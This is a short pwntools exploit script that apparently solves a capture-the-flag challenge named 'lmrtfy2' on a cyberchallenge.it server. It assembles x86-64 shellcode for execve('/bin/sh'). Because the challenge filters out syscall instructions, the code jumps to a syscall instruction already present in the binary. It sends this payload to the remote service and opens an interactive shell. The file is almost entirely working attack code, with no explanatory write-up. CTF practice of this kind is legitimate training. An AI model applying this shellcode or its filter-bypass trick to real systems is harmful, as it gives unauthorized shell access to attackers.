#!/usr/bin/env python3

from pwn import *

exe = ELF("./lmrtfy2")

context.binary = exe

# No SYSENTER, SYSCALL and INT 0x80


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("lmrty2.challs.cyberchallenge.it", 9405)

    return r



def main():
    r = conn()

    payload = asm('''
        /* filename */
        push 0;
        mov rdi, 0x68732f6e69622f;
        push rdi;
        lea rdi, qword ptr[rsp];

        /* argv */
        mov rsi, 0;

        /* envp */
        mov rdx, 0;

        /* syscall number */
        mov rax, 59

        /* SYSCALL */
        /* It's already there in the source code, we just need to calculate the offset and jump to it */
        jmp $+0x2283
        ''')

    r.sendlineafter(b'What would you like to run?\n', payload)
    r.interactive('> ')



if __name__ == "__main__":
    main()
